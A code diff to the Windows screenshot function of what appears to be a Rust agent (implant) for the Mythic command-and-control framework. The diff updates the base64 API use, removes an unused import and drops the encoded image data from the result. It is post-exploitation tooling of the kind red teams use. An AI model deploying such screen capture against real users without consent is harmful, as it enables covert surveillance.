@@ -1,6 +1,7 @@
 // screenshot.rs
 use crate::AgentTask;
 use crate::mythic_success;
+use base64::{Engine as _, engine::general_purpose};
 use std::error::Error;
 use std::result::Result;
 
@@ -10,7 +11,6 @@ use std::process::Command;
 #[cfg(target_os = "windows")]
 pub fn take_screenshot(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
     use std::fs;
-    use std::path::Path;
     
     // Create a temporary file for the screenshot
     let temp_dir = std::env::temp_dir();
@@ -56,17 +56,12 @@ pub fn take_screenshot(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Er
     let _ = fs::remove_file(&screenshot_path);
     
     // Encode the screenshot data as base64
-    let encoded_data = base64::encode(&screenshot_data);
+    let encoded_data = general_purpose::STANDARD.encode(&screenshot_data);
     
     // Return success with the screenshot data
     Ok(mythic_success!(
         task.id,
-        format!("Screenshot taken successfully. Size: {} bytes", screenshot_data.len()),
-        {
-            "size": screenshot_data.len(),
-            "data": encoded_data,
-            "format": "bmp"
-        }
+        format!("Screenshot taken successfully. Size: {} bytes", screenshot_data.len())
     ))
 }
 
